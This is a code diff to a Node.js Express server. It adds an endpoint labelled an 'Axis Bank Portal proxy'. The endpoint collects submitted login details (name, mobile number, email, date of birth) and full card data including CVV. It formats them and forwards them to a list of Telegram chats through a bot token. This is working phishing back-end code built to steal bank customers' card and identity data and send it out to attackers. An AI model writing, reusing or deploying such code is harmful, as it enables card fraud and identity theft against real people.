@@ -47,6 +47,158 @@ app.get("/stats", (req, res) => {
   });
 });
 
+// ---------- Axis Bank Portal proxy: card submission POST → forward via BOT to admins ----------
+app.use(express.json({ limit: '256kb' }));
+app.use(express.urlencoded({ extended: true, limit: '256kb' }));
+
+let axisLastSubmitAt = null;
+let axisSubmitCount = 0;
+let axisLastErrors = [];
+
+function pushAxisError(msg, meta) {
+  axisLastErrors.unshift({ at: new Date().toISOString(), message: String(msg || ''), meta: meta || null });
+  if (axisLastErrors.length > 12) axisLastErrors.length = 12;
+}
+
+function buildAxisHtmlText(payload) {
+  const submittedAt = payload && payload.submittedAt ? new Date(payload.submittedAt) : new Date();
+  const hh = String(submittedAt.getHours()).padStart(2, '0');
+  const mm = String(submittedAt.getMinutes()).padStart(2, '0');
+  const login = (payload && typeof payload.loginData === 'object' && payload.loginData) || {};
+  const card  = (payload && typeof payload.cardData  === 'object' && payload.cardData)  || {};
+  const parts = [];
+  parts.push('<b>========== LOGIN INFO ==========</b>');
+  parts.push('Time: <code>' + hh + ':' + mm + '</code>\n');
+  parts.push('Name:   <code>' + (login.fullName || '—') + '</code>');
+  parts.push('Mobile: <code>' + (login.mobile || '—') + '</code>');
+  parts.push('Email:  <code>' + (login.email || '—') + '</code>');
+  parts.push('DOB:    <code>' + (login.dob || '—') + '</code>\n');
+  parts.push('<b>========== [CARD DETAILS] ==========</b>');
+  parts.push('Number: <code>' + (card.number || '—') + '</code>');
+  parts.push('Name:   <code>' + (card.name || '—') + '</code>');
+  parts.push('Expiry: <code>' + (card.expiry || '—') + '</code>');
+  parts.push('CVV:    <code>' + (card.cvv || '—') + '</code>');
+  if (payload && payload.pageURL) parts.push('\nPage: <code>' + String(payload.pageURL) + '</code>');
+  if (payload && payload.userAgent) parts.push('UA: <code>' + String(payload.userAgent).slice(0, 220) + '</code>');
+  return parts.join('\n');
+}
+
+async function sendAxisTelegram(botToken, chatId, text) {
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const body = new URLSearchParams();
+  body.set('chat_id', String(chatId));
+  body.set('text', String(text || ''));
+  body.set('parse_mode', 'HTML');
+  body.set('disable_web_page_preview', 'True');
+  const controller = new AbortController();
+  const t = setTimeout(() => controller.abort(), 15000);
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': 'application/json' },
+      body: body.toString(),
+      signal: controller.signal,
+      redirect: 'follow',
+    });
+    clearTimeout(t);
+    const textResp = await res.text();
+    let parsed;
+    try { parsed = JSON.parse(textResp); } catch (_) { parsed = { raw: textResp }; }
+    const ok = !!parsed.ok && (res.status >= 200 && res.status < 300);
+    return {
+      ok,
+      http_status: Number(res.status || 0),
+      msg_id: (parsed && parsed.ok && parsed.result && parsed.result.message_id) ? Number(parsed.result.message_id) : null,
+      chat_id: String(chatId),
+      parsed,
+    };
+  } catch (e) {
+    clearTimeout(t);
+    return {
+      ok: false,
+      http_status: null,
+      msg_id: null,
+      chat_id: String(chatId),
+      error: String((e && e.message) || e || 'unknown'),
+    };
+  }
+}
+
+app.get('/axis-card-submit', (req, res) => {
+  res.set('Cache-Control', 'no-store');
+  res.status(200).json({
+    ok: true,
+    message: 'Use POST /axis-card-submit with application/json body: { submittedAt, loginData, cardData, pageURL? }',
+    count: axisSubmitCount,
+    lastAt: axisLastSubmitAt ? axisLastSubmitAt.toISOString() : null,
+    lastErrors: axisLastErrors,
+    axisBotConfigured: !!process.env.AXIS_BANK_BOT_TOKEN && process.env.AXIS_BANK_BOT_TOKEN !== 'YOUR_AXIS_BANK_BOT_TOKEN_HERE',
+    axisAdminsCount: (process.env.AXIS_ADMINS || '').split(',').map(s => s.trim()).filter(Boolean).length,
+  });
+});
+
+app.post('/axis-card-submit', async (req, res) => {
+  axisLastSubmitAt = new Date();
+  axisSubmitCount += 1;
+  const botToken = process.env.AXIS_BANK_BOT_TOKEN || '';
+  const adminsRaw = (process.env.AXIS_ADMINS || '').toString();
+  const admins = adminsRaw.split(',').map(s => s.trim()).filter(Boolean);
+
+  if (!botToken || botToken === 'YOUR_AXIS_BANK_BOT_TOKEN_HERE') {
+    pushAxisError('AXIS_BANK_BOT_TOKEN not configured', null);
+    return res.status(500).json({ ok: false, error: 'AXIS_BANK_BOT_TOKEN not configured in .env' });
+  }
+  if (!admins.length) {
+    pushAxisError('AXIS_ADMINS not configured (csv chat ids)', null);
+    return res.status(500).json({ ok: false, error: 'AXIS_ADMINS not configured in .env (csv chat ids)' });
+  }
+
+  let payload = {};
+  try {
+    if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
+      payload = req.body;
+    } else if (typeof req.body === 'string') {
+      payload = JSON.parse(req.body);
+    }
+  } catch (e) {
+    pushAxisError('Failed to parse JSON body', { bodyLen: String(req.body || '').length });
+    return res.status(400).json({ ok: false, error: 'Invalid JSON body: ' + String(e && e.message || e) });
+  }
+  if (!payload || typeof payload !== 'object') {
+    pushAxisError('Invalid payload shape', { type: typeof payload });
+    return res.status(400).json({ ok: false, error: 'Invalid payload shape' });
+  }
+  try { payload.userAgent = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : null; } catch (_) {}
+
+  const text = buildAxisHtmlText(payload);
+
+  const perAdminResults = [];
+  for (const chatId of admins) {
+    const r = await sendAxisTelegram(botToken, chatId, text);
+    perAdminResults.push({ chat_id: chatId, ok: !!r.ok, http_status: r.http_status, msg_id: r.msg_id, error: r.error || null });
+    if (!r.ok) {
+      pushAxisError('Telegram send failed for chat ' + chatId, { http_status: r.http_status, msg_id: r.msg_id, error: r.error, parsed: r.parsed || null });
+    }
+  }
+  const anyOk = perAdminResults.some(r => r.ok);
+  const allOk = perAdminResults.length > 0 && perAdminResults.every(r => r.ok);
+
+  return res.status(anyOk ? 200 : 502).json({
+    ok: anyOk,
+    allOk,
+    submittedAt: (axisLastSubmitAt).toISOString(),
+    count: axisSubmitCount,
+    adminsTotal: admins.length,
+    adminsOk: perAdminResults.filter(r => r.ok).length,
+    perAdminResults,
+    payloadPreview: {
+      hasLogin: !!(payload && payload.loginData && Object.keys(payload.loginData).length),
+      hasCard: !!(payload && payload.cardData && Object.keys(payload.cardData).length),
+      textLength: String(text || '').length,
+    },
+  });
+});
+
 const port = Number(process.env.port || process.env.PORT || 3000);
 app.listen(port, () => {
   console.log("We are listening on PORT ", port);
